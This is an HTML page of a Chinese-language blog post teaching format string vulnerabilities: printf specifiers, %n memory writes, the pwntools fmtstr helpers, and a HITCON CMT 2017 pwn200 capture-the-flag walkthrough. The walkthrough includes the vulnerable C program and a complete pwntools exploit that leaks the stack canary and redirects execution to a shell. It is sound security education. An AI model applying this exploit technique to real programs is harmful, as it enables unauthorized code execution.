@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>格式化字符串 | Unbelievable</title>
+
+
+    <meta name="keywords" content="格式化字符串">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="前置知识在x86的结构下，格式化字符串的参数是通过栈传递的。换言之，printf()函数打印出来的数据都直接来源于栈。  %n转换指示符将当前已成功写入流或者缓冲区的字符个数存储到由参数指定的地址中去，意味着printf也有写入内存能力。 %n$则可以指定第n个参数     指示符 类型 输出    %d 4-byte Integer   %u 4-byte Unsigned Integer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串">
+<meta property="og:url" content="https://majikoo1028.github.io/2021/07/31/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/index.html">
+<meta property="og:site_name" content="Unbelievable">
+<meta property="og:description" content="前置知识在x86的结构下，格式化字符串的参数是通过栈传递的。换言之，printf()函数打印出来的数据都直接来源于栈。  %n转换指示符将当前已成功写入流或者缓冲区的字符个数存储到由参数指定的地址中去，意味着printf也有写入内存能力。 %n$则可以指定第n个参数     指示符 类型 输出    %d 4-byte Integer   %u 4-byte Unsigned Integer">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-07-31T01:00:43.000Z">
+<meta property="article:modified_time" content="2021-07-31T14:53:55.736Z">
+<meta property="article:author" content="Tobe.Unbelievable">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary_large_image">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="/css/highlight/tomorrow-night-eighties.css" media="none" onload="if(getComputedStyle(document.documentElement).getPropertyValue('--color-mode').indexOf('dark')===-1)this.media='all'">
+        
+    
+
+    
+    
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Unbelievable" type="application/atom+xml">
+</head>
+
+    <body>
+        <div id="app">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Unbelievable</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/friends/" class="navbar-menu button">友链</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+
+         
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/friends/" class="dropdown-menu button">友链</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        格式化字符串
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2021/07/" class="post-meta__date button">2021-07-31</a>
+        
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnlib-fmtstr"><span class="toc-number">3.</span> <span class="toc-text">pwnlib.fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-CMT-2017-pwn200"><span class="toc-number">4.1.</span> <span class="toc-text">HITCON CMT 2017: pwn200</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text"></span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnlib-fmtstr"><span class="toc-number">3.</span> <span class="toc-text">pwnlib.fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-CMT-2017-pwn200"><span class="toc-number">4.1.</span> <span class="toc-text">HITCON CMT 2017: pwn200</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text"></span></a></li></ol>
+    </div>
+
+
+<article class="post content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在x86的结构下，格式化字符串的参数是通过栈传递的。换言之，<code>printf()</code>函数打印出来的数据都直接来源于栈。</p>
+<blockquote>
+<p><code>%n</code>转换指示符将当前已成功写入流或者缓冲区的字符个数存储到由参数指定的地址中去，意味着<code>printf</code>也有写入内存能力。</p>
+<p><code>%n$</code>则可以指定第n个参数</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">指示符</th>
+<th align="center">类型</th>
+<th align="center">输出</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">%d</td>
+<td align="center">4-byte</td>
+<td align="center">Integer</td>
+</tr>
+<tr>
+<td align="center">%u</td>
+<td align="center">4-byte</td>
+<td align="center">Unsigned Integer</td>
+</tr>
+<tr>
+<td align="center">%x</td>
+<td align="center">4-byte</td>
+<td align="center">Hex</td>
+</tr>
+<tr>
+<td align="center">%s</td>
+<td align="center">4-byte ptr</td>
+<td align="center">String</td>
+</tr>
+<tr>
+<td align="center">%c</td>
+<td align="center">1-byte</td>
+<td align="center">Character</td>
+</tr>
+<tr>
+<td align="center">%p</td>
+<td align="center">4-byte</td>
+<td align="center">Hex addr</td>
+</tr>
+<tr>
+<td align="center"><strong>长度</strong></td>
+<td align="center"><strong>类型</strong></td>
+<td align="center"><strong>输出</strong></td>
+</tr>
+<tr>
+<td align="center">hh</td>
+<td align="center">1-byte</td>
+<td align="center">char</td>
+</tr>
+<tr>
+<td align="center">h</td>
+<td align="center">2-byte</td>
+<td align="center">short int</td>
+</tr>
+<tr>
+<td align="center">l</td>
+<td align="center">4-byte</td>
+<td align="center">long int</td>
+</tr>
+<tr>
+<td align="center">ll</td>
+<td align="center">8-byte</td>
+<td align="center">long long int</td>
+</tr>
+</tbody></table>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当格式字符串可以被外部更改时，则可构造特定格式字符串达到泄露、修改任意地址内存数据。</p>
+<p>例如：</p>
+<ul>
+<li><code>printf(&quot;%4$s&quot;)</code>会输出栈上对应<strong>偏移</strong>为4处地址 所指的内存数据</li>
+<li><code>printf(&quot;\x78\x56\x34\x12&quot;)</code>会将值0x12345678写入栈对应<strong>偏移</strong>处</li>
+<li>上面两点结合起来就可泄露任意地址内存，如(假设偏移为4)：<code>printf(&quot;\x78\x56\x34\x12:%4$s&quot;)</code>则会输出地址0x12345678处的内容</li>
+</ul>
+<h2 id="pwnlib-fmtstr"><a href="#pwnlib-fmtstr" class="headerlink" title="pwnlib.fmtstr"></a>pwnlib.fmtstr</h2><p>pwntools里提供了利用格式化字符串漏洞的一些工具</p>
+<p><code>class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</code></p>
+<ul>
+<li><strong>execute_fmt</strong> ( <em>function</em> ) – 调用与易受攻击的进程进行通信的函数</li>
+<li><strong>offset</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a> ) – 您控制的第一个格式化程序的偏移量</li>
+<li><strong>padlen</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a> ) – 要在有效负载之前添加的 pad 的大小</li>
+<li><strong>numbwritten</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a> ) – 已经写入的字节数</li>
+</ul>
+<p><strong>当不给出参数offset时，则尝试通过泄漏堆栈数据来找到正确的偏移量</strong>，事实上可以总是这么做</p>
+<p>主要参数是<strong>execute_fmt</strong>，一般要视程序来编写，基本模板如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	ms = process(<span class="string">&#x27;./pwn&#x27;</span>)        <span class="comment"># 程序中如果没有一直开启recv()的话就要加上这个</span></span><br><span class="line">    							<span class="comment"># 因为源码里面自动算偏移的时候会不停地调用这个交互函数爆破offset(0,1000)</span></span><br><span class="line">	ms.recvuntil(<span class="string">&quot;your name:&quot;</span>)    <span class="comment"># 无用回显可以提前收取</span></span><br><span class="line">	ms.sendline(payload)</span><br><span class="line">	info = ms.recvline()         <span class="comment"># info放的一定是格式化字符串的输出信息，即 printf(&quot;%xxx&quot;) 的输出结果</span></span><br><span class="line">	<span class="keyword">return</span> info</span><br></pre></td></tr></table></figure></div>
+<p><code>class pwnlib.fmtstr.fmtstr_playload(offset=None, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></p>
+<ul>
+<li><strong>offset</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a> ) – 您控制的第一个格式化程序的偏移量（可由上面构造方法自动获取）</li>
+<li><strong>writes</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/stdtypes.html#dict"><em>dict</em></a> ) – 带有 addr, value 的 dict<code>&#123;addr: value, addr2: value2&#125;</code></li>
+<li><strong>numbwritten</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a> ) – printf 函数已经写入的字节数</li>
+<li><strong>write_size</strong> ( <a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a> ) – 必须是<code>byte</code>,<code>short</code>或<code>int</code>。告诉你是要一个字节一个字节写，一个短写还是一个 int 写（hhn、hn 或 n）</li>
+</ul>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="HITCON-CMT-2017-pwn200"><a href="#HITCON-CMT-2017-pwn200" class="headerlink" title="HITCON CMT 2017: pwn200"></a>HITCON CMT 2017: pwn200</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">canary_protect_me</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="built_in">printf</span>(buf);		<span class="comment">// format string</span></span><br><span class="line">	gets(buf);			<span class="comment">// buf overflow</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">开启Partial RELRO、Canary和NX</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+<p><strong>漏洞利用思路</strong></p>
+<p>开了Canary，没法直接栈溢出劫持返回地址，所以可以先调试找到Canary存放的地址，再利用格式化字符串泄露Canary的值，在栈溢出时覆盖上去即可</p>
+<p>完整exp如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;%15$x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: 0x%x&quot;</span> % canary)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x804854D</span>		<span class="comment"># canary_protect_me</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x28</span> + p32(canary) + <span class="string">&quot;A&quot;</span>*<span class="number">0xc</span> + p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+<h2 id><a href="#" class="headerlink" title></a></h2>
+    </div>
+     
+    <div class="post-footer__meta"><p>updated at 2021-07-31</p></div> 
+    <div class="post-meta__cats"><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-tags__link button"># 格式化字符串</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/2021/07/25/pwntools%E5%AD%A6%E4%B9%A0/" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            pwntools学习
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+
+            <footer class="footer">
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <link rel="stylesheet" href="/live2d/css/live2d.css" />
+    <div id="landlord">
+        <div class="message" style="opacity:0"></div>
+        <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+        <div class="hide-button">隐藏</div>
+    </div>
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript">
+        var message_Path = '/live2d/'
+        var home_Path = 'https://unbelievable.cool/'
+    </script>
+    <script type="text/javascript" src="/live2d/js/live2d.js"></script>
+    <!--<script type="text/javascript" src="/live2d/js/message.js"></script>-->
+    <script type="text/javascript">
+        loadlive2d("live2d", "/live2d/model/shifuku/shifuku.model.json");
+    </script>
+        <p class="footer-copyright">
+            Copyright © 2021&nbsp;-&nbsp;2021 <a href="/">Unbelievable</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+  
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('true')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+
+    <script>
+        window.onload = () => {
+            document.querySelectorAll('.sliding-fold').forEach((item) => {
+                item.querySelector('summary').onclick = () => {
+                    item.classList.toggle("collapsed");
+                    item.classList.toggle("expanded");
+                };
+            });
+        };
+    </script>
+ 
+
+
+    
+
+    
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"3IAE9kFUvNz7NdN7PcECz4Xj-gzGzoHsz","appKey":"9EEiERWEkTIdpRtAlNy7160Q","placeholder":"冲！","path":null,"avatar":"hide","meta":["nick","mail","link"],"pageSize":null,"lang":null,"visitor":null,"highlight":null,"avatarForce":null,"recordIP":null,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+
+
+
+    </body>
+</html>
